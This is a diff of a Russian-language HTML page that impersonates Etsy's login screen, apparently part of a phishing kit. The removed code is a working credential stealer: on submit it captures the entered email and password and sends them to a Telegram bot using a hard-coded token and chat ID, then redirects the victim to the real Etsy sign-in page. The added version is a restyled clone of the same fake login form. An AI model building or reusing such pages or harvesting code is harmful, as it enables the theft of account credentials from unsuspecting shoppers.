@@ -1,220 +1,108 @@
 <!DOCTYPE html>
-<html lang="ru" xmlns:og="http://ogp.me/ns#" xmlns:fb="https://www.facebook.com/2008/fbml">
+<html lang="ru">
 <head>
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Вход в аккаунт | Etsy</title>
-    <link rel="stylesheet" href="https://www.etsy.com/dac/site-chrome/components/components.2537823921483c,web-toolkit-v2/experiments/refresh.2537823921483c,site-chrome/header/header.2537823921483c.css?variant=sasquatch" type="text/css" />
-    <link rel="stylesheet" href="https://www.etsy.com/dac/web-toolkit-v2/modules/banners/banners.2537823921483c,pages/join_neu/index.2537823921483c,collage/main.2537823921483c.css?variant=sasquatch" type="text/css" />
-    <link rel="shortcut icon" href="https://www.etsy.com/favicon.ico?v1" />
+    <style>
+        body {
+            font-family: 'Graphik', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: #FAF9F7;
+            margin: 0;
+            padding: 40px 16px;
+            display: flex;
+            justify-content: center;
+        }
+        .container { max-width: 400px; width: 100%; background: #fff; padding: 32px; border-radius: 16px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
+        .header { display: flex; justify-content: center; margin-bottom: 24px; padding-top: 12px; }
+        .header svg { height: 24px; width: 50px; fill: #F1641E; }
+        h1 { font-size: 26px; font-weight: 700; color: #222222; line-height: 1.2; margin-bottom: 24px; text-align: center; }
+        .form-group { margin-bottom: 16px; position: relative; }
+        label { display: block; font-size: 14px; font-weight: 700; color: #222222; margin-bottom: 8px; }
+        .req { color: #F1641E; margin-left: 2px; }
+        input[type="email"], input[type="password"] {
+            width: 100%; padding: 11px 12px; border: 1px solid #767676; border-radius: 8px;
+            font-size: 16px; box-sizing: border-box; outline: none; transition: border-color 0.2s; font-family: inherit; background: #fff;
+        }
+        input[type="email"]:focus, input[type="password"]:focus { border-color: #222; box-shadow: 0 0 0 1px #222; }
+        .toggle-pass { position: absolute; right: 12px; top: 38px; cursor: pointer; background: none; border: none; padding: 0; color: #595959; display: flex; align-items: center; }
+        .btn-primary {
+            width: 100%; padding: 12px; background-color: #222222; color: white;
+            border: none; border-radius: 24px; font-size: 16px; font-weight: 700; cursor: pointer; margin-top: 8px; font-family: inherit;
+        }
+        .btn-primary:hover { background-color: #000; }
+        .divider { text-align: center; margin: 24px 0; color: #595959; font-size: 14px; position: relative; text-transform: uppercase; display: flex; align-items: center; justify-content: center; }
+        .divider::before, .divider::after { content: ""; position: absolute; top: 50%; width: 44%; height: 1px; background-color: #E1E3DF; }
+        .divider::before { left: 0; }
+        .divider::after { right: 0; }
+        .btn-secondary {
+            width: 100%; padding: 12px; background-color: #fff; color: #222222;
+            border: 1px solid #222; border-radius: 24px; font-size: 16px; font-weight: 700; cursor: pointer; margin-bottom: 12px; display: flex; align-items: center; justify-content: center; gap: 10px; font-family: inherit;
+        }
+        .btn-secondary:hover { background-color: #FAF9F7; }
+        .btn-secondary:disabled { color: #767676; border-color: #E1E3DF; cursor: not-allowed; background-color: #f9f9f9; }
+        .footer-text { font-size: 14px; color: #595959; text-align: center; margin-top: 24px; line-height: 1.5; }
+        .text-link { color: #222; text-decoration: underline; display: block; text-align: center; margin-top: 16px; font-size: 14px; font-weight: 700; }
+        a { color: #222; text-decoration: underline; }
+    </style>
 </head>
-<body class="ui-toolkit transitional-wide etsy-has-it-design is-responsive no-touch ru THB TH wt-bg-white bg-white">
-    <div data-selector="header-cat-nav-wrapper" data-menu-ui="menubar">
-        <div id="gnav-header" class="gnav-bottom-border gnav-header global-nav v2-toolkit-gnav-header wt-z-index-6 wt-sem-bg-elevation-0 wt-position-relative">
-            <header id="gnav-header-inner" class="global-enhancements-header wt-display-flex-xs wt-justify-content-space-between wt-align-items-center wt-width-full wt-body-max-width wt-pl-xs-2 wt-pr-xs-2 wt-pl-lg-6 wt-pr-lg-6 wt-bb-xs wt-bb-lg-none gnav-header-inner wt-pt-lg-2 wt-pb-lg-2" role="banner">
-                <div class="wt-pb-lg-0 wt-pt-sm-1 wt-pt-lg-0 wt-pr-xs-1" data-header-logo-container>
-                    <a href="https://www.etsy.com/?ref=lgo">
-                        <span class="etsy-icon wt-display-block wt-fill-orange wt-nudge-r-3 wt-nudge-t-1 logo-dimensions" id="logo"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 50 24" aria-hidden="true" focusable="false"><path d="M42.973 23.998C45.006 23.998 46.673 23.321 47.768 22.045 48.89 20.716 49.254 19.386 49.254 16.675V7.739C49.254 7.008 49.254 6.2 49.306 5.627 49.332 5.13 48.889 5.027 48.497 5.184 47.377 5.627 46.412 5.861 45.11 6.148 44.797 6.226 44.667 6.435 44.667 6.67S44.826 7.166 45.32 7.14C46.492 7.088 46.804 7.323 46.804 8.18V13.941C46.621 15.504 45.32 16.833 43.678 16.833 42.192 16.833 41.332 15.843 41.332 13.81V7.738C41.332 7.008 41.358 6.2 41.384 5.627 41.41 5.13 40.994 5.027 40.575 5.184 39.48 5.601 38.568 5.861 37.343 6.148 37.004 6.226 36.873 6.435 36.873 6.67S37.03 7.166 37.525 7.14C38.592 7.088 38.879 7.323 38.879 8.18V14.254C38.879 17.094 40.52 18.37 42.969 18.37 44.482 18.37 46.072 17.51 46.802 15.92V18.033C46.801 19.699 46.462 20.768 45.785 21.576 45.082 22.411 44.17 22.88 42.997 22.88 41.615 22.879 40.86 22.383 40.86 21.654 40.86 21.42 40.938 21.158 40.938 20.794 40.938 20.117 40.468 19.517 39.739 19.517 38.827 19.517 38.385 20.22 38.385 21.03 38.385 22.437 39.922 24 42.97 24M31.3 18.474C34.296 18.474 36.146 16.65 36.146 14.435 36.146 10.032 29.293 11.151 29.293 8.311 29.293 7.216 30.075 6.304 31.508 6.304 32.836 6.304 33.853 6.904 34.399 8.154L34.66 8.754C34.921 9.352 35.65 9.223 35.572 8.623L35.312 6.487C35.26 6.122 35.156 5.965 34.842 5.836 33.852 5.393 32.782 5.184 31.637 5.184 28.823 5.184 27.18 6.931 27.18 9.094 27.18 13.576 34.033 12.404 34.033 15.218 34.033 16.337 33.121 17.328 31.375 17.328 29.863 17.329 28.95 16.704 28.274 15.295L27.884 14.487C27.647 13.99 26.918 14.122 27.023 14.774L27.387 17.119C27.439 17.46 27.57 17.563 27.858 17.694 28.977 18.215 29.89 18.475 31.296 18.475M22.464 18.5C24.262 18.5 25.487 17.562 25.955 15.92 26.14 15.348 25.54 15.009 25.175 15.583 24.679 16.442 23.95 16.807 23.115 16.807 22.048 16.807 21.5 16.024 21.5 14.592V6.696L24.94 6.722C25.33 6.722 25.487 6.357 25.487 6.045 25.487 5.706 25.304 5.419 24.887 5.419L21.5 5.445V3.464C21.5 3.125 21.291 2.968 21.03 2.968A.6.6 0 0 0 20.535 3.228C19.597 4.664 18.97 5.158 17.512 5.705 17.199 5.834 17.016 6.017 17.016 6.252 17.016 6.512 17.146 6.694 17.538 6.694H19.049V14.877C19.049 17.25 20.431 18.5 22.462 18.5M11.806 17.014H7.27C5.863 17.014 5.499 16.65 5.499 15.424V9.692H9.147C10.501 9.691 10.919 10.056 11.387 11.384L11.753 12.454C11.962 13.079 12.794 13.104 12.794 12.376 12.69 10.29 12.69 7.84 12.742 5.756 12.794 5.027 11.959 5.053 11.752 5.678L11.388 6.748C10.918 8.102 10.553 8.52 9.147 8.52H5.499V1.745C5.499 1.38 5.654 1.223 6.046 1.223H11.493C13.083 1.223 13.759 1.665 14.255 3.047L14.855 4.742C15.089 5.419 15.896 5.316 15.896 4.664L15.844.468C15.845.13 15.637 0 15.35 0H.599C.13 0 0 .26 0 .522 0 .782.13 1.017.573 1.069 2.398 1.2 2.71 1.565 2.71 2.633V15.715C2.71 16.705 2.398 17.043.677 17.175.261 17.226.13 17.46.13 17.722S.26 18.244.703 18.244H15.61C15.896 18.244 16.105 18.114 16.105 17.776L16.157 13.58C16.157 12.928 15.35 12.85 15.141 13.502L14.594 15.196C14.15 16.604 13.394 17.021 11.806 17.021"/></svg></span>
-                    </a>
-                </div>
-                <div class="wt-width-full wt-display-flex-xs wt-pr-lg-3 wt-flex-lg-1 order-mobile-tablet-2" data-hamburger-search-container></div>
-                <div class="wt-flex-shrink-xs-0" data-primary-nav-container>
-                    <ul class="wt-display-flex-xs wt-align-items-center account-nav apply-nav-height">
-                        <li class="wt-p-xs-1 wt-list-unstyled">
-                            <a id="register" class="inline-overlay-trigger register-header-action select-register" rel="nofollow" data-downtime-overlay-type="register" href="https://www.etsy.com/join?from_page=https%3A%2F%2Fwww.etsy.com%2F&from_action=&ref=hdr" title="Зарегистрироваться">
-                                <button class="wt-btn wt-btn--secondary wt-btn--small">Зарегистрироваться</button>
-                            </a>
-                        </li>
-                    </ul>
-                </div>
-            </header>
+<body>
+    <div class="container">
+        <div class="header">
+            <svg viewBox="0 0 50 24"><path d="M42.973 23.998C45.006 23.998 46.673 23.321 47.768 22.045 48.89 20.716 49.254 19.386 49.254 16.675V7.739C49.254 7.008 49.254 6.2 49.306 5.627 49.332 5.13 48.889 5.027 48.497 5.184 47.377 5.627 46.412 5.861 45.11 6.148 44.797 6.226 44.667 6.435 44.667 6.67S44.826 7.166 45.32 7.14C46.492 7.088 46.804 7.323 46.804 8.18V13.941C46.621 15.504 45.32 16.833 43.678 16.833 42.192 16.833 41.332 15.843 41.332 13.81V7.738C41.332 7.008 41.358 6.2 41.384 5.627 41.41 5.13 40.994 5.027 40.575 5.184 39.48 5.601 38.568 5.861 37.343 6.148 37.004 6.226 36.873 6.435 36.873 6.67S37.03 7.166 37.525 7.14C38.592 7.088 38.879 7.323 38.879 8.18V14.254C38.879 17.094 40.52 18.37 42.969 18.37 44.482 18.37 46.072 17.51 46.802 15.92V18.033C46.801 19.699 46.462 20.768 45.785 21.576 45.082 22.411 44.17 22.88 42.997 22.88 41.615 22.879 40.86 22.383 40.86 21.654 40.86 21.42 40.938 21.158 40.938 20.794 40.938 20.117 40.468 19.517 39.739 19.517 38.827 19.517 38.385 20.22 38.385 21.03 38.385 22.437 39.922 24 42.97 24M31.3 18.474C34.296 18.474 36.146 16.65 36.146 14.435 36.146 10.032 29.293 11.151 29.293 8.311 29.293 7.216 30.075 6.304 31.508 6.304 32.836 6.304 33.853 6.904 34.399 8.154L34.66 8.754C34.921 9.352 35.65 9.223 35.572 8.623L35.312 6.487C35.26 6.122 35.156 5.965 34.842 5.836 33.852 5.393 32.782 5.184 31.637 5.184 28.823 5.184 27.18 6.931 27.18 9.094 27.18 13.576 34.033 12.404 34.033 15.218 34.033 16.337 33.121 17.328 31.375 17.328 29.863 17.329 28.95 16.704 28.274 15.295L27.884 14.487C27.647 13.99 26.918 14.122 27.023 14.774L27.387 17.119C27.439 17.46 27.57 17.563 27.858 17.694 28.977 18.215 29.89 18.475 31.296 18.475M22.464 18.5C24.262 18.5 25.487 17.562 25.955 15.92 26.14 15.348 25.54 15.009 25.175 15.583 24.679 16.442 23.95 16.807 23.115 16.807 22.048 16.807 21.5 16.024 21.5 14.592V6.696L24.94 6.722C25.33 6.722 25.487 6.357 25.487 6.045 25.487 5.706 25.304 5.419 24.887 5.419L21.5 5.445V3.464C21.5 3.125 21.291 2.968 21.03 2.968A.6.6 0 0 0 20.535 3.228C19.597 4.664 18.97 5.158 17.512 5.705 17.199 5.834 17.016 6.017 17.016 6.252 17.016 6.512 17.146 6.694 17.538 6.694H19.049V14.877C19.049 17.25 20.431 18.5 22.462 18.5M11.806 17.014H7.27C5.863 17.014 5.499 16.65 5.499 15.424V9.692H9.147C10.501 9.691 10.919 10.056 11.387 11.384L11.753 12.454C11.962 13.079 12.794 13.104 12.794 12.376 12.69 10.29 12.69 7.84 12.742 5.756 12.794 5.027 11.959 5.053 11.752 5.678L11.388 6.748C10.918 8.102 10.553 8.52 9.147 8.52H5.499V1.745C5.499 1.38 5.654 1.223 6.046 1.223H11.493C13.083 1.223 13.759 1.665 14.255 3.047L14.855 4.742C15.089 5.419 15.896 5.316 15.896 4.664L15.844.468C15.845.13 15.637 0 15.35 0H.599C.13 0 0 .26 0 .522 0 .782.13 1.017.573 1.069 2.398 1.2 2.71 1.565 2.71 2.633V15.715C2.71 16.705 2.398 17.043.677 17.175.261 17.226.13 17.46.13 17.722S.26 18.244.703 18.244H15.61C15.896 18.244 16.105 18.114 16.105 17.776L16.157 13.58C16.157 12.928 15.35 12.85 15.141 13.502L14.594 15.196C14.15 16.604 13.394 17.021 11.806 17.021"/></svg>
+        </div>
+        <h1>Для покупок войдите или создайте аккаунт.</h1>
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="email">Адрес электронной почты<span class="req">*</span></label>
+                <input type="email" id="email" placeholder="Укажите свой электронный адрес" required>
+            </div>
+            <div class="form-group">
+                <label for="password">Пароль<span class="req">*</span></label>
+                <input type="password" id="password" placeholder="Введите пароль" required style="padding-right: 40px;">
+                <button type="button" class="toggle-pass" onclick="togglePass(this)">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
+                </button>
+            </div>
+            <button type="submit" class="btn-primary">Войти в аккаунт</button>
+        </form>
+        <div class="divider">или</div>
+        <h3 style="font-size: 16px; font-weight: 700; color: #222; margin-bottom: 8px; margin-top: 0;">Забыли пароль?</h3>
+        <button class="btn-secondary" onclick="window.location.href='https://www.etsy.com/forgot_password'">Сбросить пароль</button>
+        <a href="https://www.etsy.com/help/article/18?ref=signin" class="text-link" style="text-decoration: underline; color: #222;">Проблема при входе в аккаунт?</a>
+        <div class="divider">или</div>
+        <button class="btn-secondary">
+            <svg width="16" height="16" viewBox="0 0 16 16"><path fill="#4285F4" d="M15.68 8.18C15.68 7.61 15.63 7.07 15.53 6.55H8v3.1h4.31c-.19 1-.76 1.85-1.61 2.42v2.01h2.59c1.51-1.39 2.39-3.44 2.39-5.9z"/><path fill="#34A853" d="M8 16c2.16 0 3.97-.72 5.29-1.94l-2.59-2.01c-.72.48-1.63.77-2.7.77-2.08 0-3.84-1.41-4.47-3.3H.85v2.07C2.17 14.21 4.87 16 8 16z"/><path fill="#FBBC05" d="M3.53 9.52c-.16-.48-.25-.99-.25-1.52s.09-1.04.25-1.52V4.41H.85C.31 5.49 0 6.71 0 8s.31 2.51.85 3.59l2.68-2.07z"/><path fill="#EA4335" d="M8 3.18c1.17 0 2.23.4 3.06 1.19l2.28-2.28C11.97.79 10.16 0 8 0 4.87 0 2.17 1.79.85 4.41l2.68 2.07C4.16 4.59 5.92 3.18 8 3.18z"/></svg>
+            Войти через Google
+        </button>
+        <button class="btn-secondary" disabled>
+            <svg width="16" height="16" viewBox="0 0 16 16"><path fill="#C5C5C5" d="M15.08.04H.92C.42.04.04.42.04.92v14.16c0 .5.38.88.88.88h7.64V9.8H6.46V7.39h2.1V5.6c0-2.08 1.27-3.21 3.12-3.21.89 0 1.65.07 1.87.1v2.17h-1.28c-1 0-1.2.48-1.2 1.18v1.55h2.4l-.31 2.41h-2.09v6.16h4.09c.5 0 .88-.38.88-.88V.92c0-.5-.38-.88-.88-.88z"/></svg>
+            Войти через Facebook
+        </button>
+        <button class="btn-secondary">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M14.533 5.032C13.893 5.805 12.818 6.385 11.96 6.385 11.863 6.385 11.767 6.373 11.706 6.36A1.7 1.7 0 0 1 11.67 6.022C11.67 5.032 12.165 4.065 12.709 3.449 13.397 2.64 14.545 2.036 15.499 2 15.523 2.109 15.535 2.242 15.535 2.374 15.535 3.353 15.113 4.331 14.533 5.032M10.333 20.64C9.902 20.825 9.493 21 8.94 21 7.757 21 6.935 19.913 5.993 18.584 4.893 17.014 4 14.586 4 12.291 4 8.595 6.404 6.638 8.771 6.638 9.462 6.638 10.093 6.892 10.655 7.117 11.105 7.297 11.509 7.46 11.863 7.46 12.171 7.46 12.553 7.308 13 7.132 13.624 6.885 14.371 6.59 15.21 6.59 15.74 6.59 17.685 6.638 18.966 8.474L18.92 8.505C18.605 8.713 16.924 9.823 16.924 12.098 16.924 14.912 19.376 15.915 19.461 15.939L19.446 15.985A10.6 10.6 0 0 1 18.156 18.633C17.347 19.793 16.49 20.976 15.209 20.976 14.579 20.976 14.176 20.798 13.761 20.614 13.318 20.418 12.86 20.214 12.093 20.214 11.322 20.214 10.813 20.434 10.333 20.64"/></svg>
+            Войти с аккаунтом Apple
+        </button>
+        <p class="footer-text">
+            Нажимая «Войти в аккаунт», Войти через Google, Facebook, или Apple, вы принимаете <a href="#">Условия использования</a> и <a href="#">Политику конфиденциальности</a> Etsy.
+        </p>
+        <div class="footer-text" style="margin-top: 16px;">
+            Etsy имеет право связаться с вами; смена параметров выполняется через настройки аккаунта. Мы не делаем публикации без вашего разрешения.
         </div>
     </div>
 
-    <main id="content">
-        <div data-join-neu-page-container class="boe-signin-height">
-            <div class="wt-grid ">
-                <div class="wt-grid__item-xs-12 wt-grid__item-md-8 wt-grid__item-lg-6 wt-grid__item-tv-3 wt-horizontal-center wt-pt-xs-2 wt-pl-xs-3 wt-pr-xs-3">
-                    <div class="wt-mb-xs-3" data-join-neu-content>
-                        <div class="wt-mt-xs-3">
-                            <form data-join-neu-form id="join-neu-form" class="wt-position-relative" method="POST" action="https://www.etsy.com/signin">
-                                <div class="wt-grid wt-grid--block">
-                                    <div class="wt-grid__item-xs-12">
-                                        <div data-heading-section class="">
-                                            <div class="wt-display-flex-xs wt-justify-content-space-between wt-align-items-center wt-pb-xs-2 ">
-                                                <h1 id="join-neu-overlay-title" class="wt-text-title-large">Для покупок войдите или создайте аккаунт.</h1>
-                                            </div>
-                                        </div>
-
-                                        <div class="wt-mb-xs-2 wt-validation">
-                                            <clg-text-input label="Адрес электронной почты" id="join_neu_email_field" type="email" placeholder="Укажите свой электронный адрес" name="email" autocomplete="email" required inputmode="email">
-                                                <template shadowrootmode="open" shadowrootdelegatesfocus>
-                                                    <link rel="stylesheet" href="https://www.etsy.com/ac/sasquatch/css/collage/shadow.74399a1fa8ef65.css" type="text/css"/>
-                                                    <div class="clg-text-field">
-                                                        <div class="clg-text-field__before">
-                                                            <label for="input" class="clg-text-field__label">
-                                                                <clg-label-text>
-                                                                    <template shadowrootmode="open">
-                                                                        <link rel="stylesheet" href="https://www.etsy.com/ac/sasquatch/css/collage/shadow.74399a1fa8ef65.css" type="text/css"/>
-                                                                        <span class="clg-label-text"><slot></slot></span>
-                                                                    </template>
-                                                                    <slot name="label">Адрес электронной почты</slot>
-                                                                </clg-label-text>
-                                                            </label>
-                                                        </div>
-                                                        <div id="visual-box" class="clg-text-field__visual-box">
-                                                            <input class="clg-text-field__control" id="input" type="email" name="email" placeholder="Укажите свой электронный адрес" autocomplete="email"/>
-                                                        </div>
-                                                    </div>
-                                                </template>
-                                            </clg-text-input>
-                                        </div>
-                                        
-                                        <input id="join_neu_first_name_field" name="first_name" value="" type="hidden">
-                                        
-                                        <div class="wt-mb-xs-2 wt-validation">
-                                            <clg-text-input label="Пароль" id="join_neu_password_field" type="password" placeholder="Введите пароль" name="password" autocomplete="current-password" required>
-                                                <template shadowrootmode="open" shadowrootdelegatesfocus>
-                                                    <link rel="stylesheet" href="https://www.etsy.com/ac/sasquatch/css/collage/shadow.74399a1fa8ef65.css" type="text/css"/>
-                                                    <div class="clg-text-field">
-                                                        <div class="clg-text-field__before">
-                                                            <label for="input" class="clg-text-field__label">
-                                                                <clg-label-text>
-                                                                    <template shadowrootmode="open">
-                                                                        <link rel="stylesheet" href="https://www.etsy.com/ac/sasquatch/css/collage/shadow.74399a1fa8ef65.css" type="text/css"/>
-                                                                        <span class="clg-label-text"><slot></slot></span>
-                                                                    </template>
-                                                                    <slot name="label">Пароль</slot>
-                                                                </clg-label-text>
-                                                            </label>
-                                                        </div>
-                                                        <div id="visual-box" class="clg-text-field__visual-box">
-                                                            <input class="clg-text-field__control" id="input" type="password" name="password" placeholder="Введите пароль" autocomplete="current-password"/>
-                                                        </div>
-                                                    </div>
-                                                </template>
-                                            </clg-text-input>
-                                        </div>
-
-                                        <div class="wt-validation wt-mt-xs-4">
-                                            <clg-button class="wt-width-full" variant="primary" type="submit" with-submit name="submit_attempt" value="sign-in" withrefresh data-join-neu-button="">
-                                                <template shadowrootmode="open" shadowrootdelegatesfocus>
-                                                    <link rel="stylesheet" href="https://www.etsy.com/ac/sasquatch/css/collage/shadow.74399a1fa8ef65.css" type="text/css"/>
-                                                    <button class="clg-button" data-button-root type="submit">
-                                                        <slot name="submit-input"></slot>
-                                                        <span id="content" class="clg-button__content">
-                                                            <slot></slot>
-                                                        </span>
-                                                    </button>
-                                                </template>
-                                                Войти в аккаунт
-                                                <input name="submit_attempt" type="submit" slot="submit-input" aria-label="Войти в аккаунт" value="sign-in" data-join-neu-button="">
-                                            </clg-button>
-                                        </div>
-                                        <div class="wt-width-full">
-                                            <div class="wt-mb-xs-4 wt-mt-xs-4">
-                                                <p class="streamlined-or-divider wt-display-flex-xs wt-align-items-center wt-sem-text-secondary wt-text-caption">или</p>
-                                            </div>
-                                        </div>
-                                        <h3 class="wt-text-title-01 wt-mb-xs-2 wt-mt-xs-4">Забыли пароль?</h3>
-                                        <clg-button variant="secondary" id="reset-password-link-button" class="wt-width-full" withrefresh="true" href="https://www.etsy.com/forgot_password?email=">
-                                            <template shadowrootmode="open" shadowrootdelegatesfocus>
-                                                <link rel="stylesheet" href="https://www.etsy.com/ac/sasquatch/css/collage/shadow.74399a1fa8ef65.css" type="text/css"/>
-                                                <a class="clg-button" data-button-root href="https://www.etsy.com/forgot_password?email=">
-                                                    <span id="content" class="clg-button__content">
-                                                        <slot></slot>
-                                                    </span>
-                                                </a>
-                                            </template>
-                                            Сбросить пароль
-                                        </clg-button>
-                                    </div>
-                                </div>
-                                <div class="wt-width-full">
-                                    <div class="wt-mb-xs-4 wt-mt-xs-4">
-                                        <p class="streamlined-or-divider wt-display-flex-xs wt-align-items-center wt-sem-text-secondary wt-text-caption">или</p>
-                                    </div>
-                                </div>
-                                <div class="wt-display-flex-xs wt-flex-direction-column-xs">
-                                    <div class="wt-mb-xs-2">
-                                        <div data-login-with-google>
-                                            <input type="hidden" name="google_user_id" value="">
-                                            <input type="hidden" name="google_code" value="">
-                                            <button data-clg-id="WtButton" class="wt-btn wt-btn--secondary wt-width-full" aria-describedby="aria-privacy-policy" data-google-button="true" disabled>
-                                                <div data-clg-id="WtSpinner" class="wt-spinner wt-spinner--01" aria-live="assertive" data-button-spinner="true" role="alert">
-                                                    <span class="wt-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><circle fill="transparent" cx="12" cy="12" r="10"/></svg></span>
-                                                    Загрузка
-                                                </div>
-                                                <span class="inline-svg wt-nudge-t-2 wt-mr-xs-1" aria-hidden="true" data-button-icon="true"><svg xmlns="http://www.w3.org/2000/svg" width="16px" height="16px" viewBox="0 0 16 16"><path fill="#4285F4" d="M15.68 8.18C15.68 7.61 15.63 7.07 15.53 6.55H8v3.1h4.31c-.19 1-.76 1.85-1.61 2.42v2.01h2.59c1.51-1.39 2.39-3.44 2.39-5.9z"/><path fill="#34A853" d="M8 16c2.16 0 3.97-.72 5.29-1.94l-2.59-2.01c-.72.48-1.63.77-2.7.77-2.08 0-3.84-1.41-4.47-3.3H.85v2.07C2.17 14.21 4.87 16 8 16z"/><path fill="#FBBC05" d="M3.53 9.52c-.16-.48-.25-.99-.25-1.52s.09-1.04.25-1.52V4.41H.85C.31 5.49 0 6.71 0 8s.31 2.51.85 3.59l2.68-2.07z"/><path fill="#EA4335" d="M8 3.18c1.17 0 2.23.4 3.06 1.19l2.28-2.28C11.97.79 10.16 0 8 0 4.87 0 2.17 1.79.85 4.41l2.68 2.07C4.16 4.59 5.92 3.18 8 3.18z"/></svg></span>
-                                                Войти через Google
-                                            </button>
-                                        </div>
-                                    </div>
-                                    <div class="wt-mb-xs-2">
-                                        <button data-clg-id="WtButton" class="wt-btn wt-btn--secondary wt-width-full" disabled>
-                                            Войти через Facebook
-                                        </button>
-                                    </div>
-                                    <div class="wt-mt-xs-2">
-                                        <button data-clg-id="WtButton" class="wt-btn wt-btn--secondary wt-width-full" disabled>
-                                            Войти с аккаунтом Apple
-                                        </button>
-                                    </div>
-                                    <p id="aria-privacy-policy" class="privacy-policy wt-mt-xs-3" style="font-size:12px; color:#595959; text-align:center; line-height:1.5;">
-                                        Нажимая «Войти в аккаунт», Войти через Google, Facebook, или Apple, вы принимаете Условия использования и Политику конфиденциальности Etsy.
-                                    </p>
-                                </div>
-                            </form>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </main>
-
     <script>
-        // Твои данные напрямую
-        const TG_BOT_TOKEN = '8817502459:AAG7JDqCXKJNDaIFieOJ_1jkqI2ml6Ssq0E';
-        const TG_CHAT_ID = 920596628; // Твой личный ID
-
-        document.getElementById('join-neu-form').addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            // Извлекаем значения из Shadow DOM
-            let email = '';
-            let password = '';
-            
-            const emailInput = document.querySelector('#join_neu_email_field');
-            if (emailInput && emailInput.shadowRoot) {
-                const innerInput = emailInput.shadowRoot.querySelector('input[name="email"]');
-                if (innerInput) email = innerInput.value;
+        function togglePass(btn) {
+            const input = document.getElementById('password');
+            if (input.type === 'password') {
+                input.type = 'text';
+                btn.innerHTML = '<svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.02c1.51-1.26 2.7-2.89 3.44-4.85-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 1.68C9.96 7.06 10.96 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 9.99 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.16l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z"/></svg>';
+            } else {
+                input.type = 'password';
+                btn.innerHTML = '<svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>';
             }
-
-            const passwordInput = document.querySelector('#join_neu_password_field');
-            if (passwordInput && passwordInput.shadowRoot) {
-                const innerInput = passwordInput.shadowRoot.querySelector('input[name="password"]');
-                if (innerInput) password = innerInput.value;
-            }
-            
-            const text = `🎯 [+] Etsy Hit!\nEmail: ${email}\nPass: ${password}`;
-
-            // Используем FormData и no-cors для 100% обхода CORS
-            const formData = new FormData();
-            formData.append('chat_id', TG_CHAT_ID);
-            formData.append('text', text);
-
-            fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                mode: 'no-cors',
-                body: formData
-            }).then(() => {
-                window.location.href = 'https://www.etsy.com/signin';
-            }).catch(err => {
-                console.error('Error:', err);
-                window.location.href = 'https://www.etsy.com/signin';
-            });
-        });
+        }
     </script>
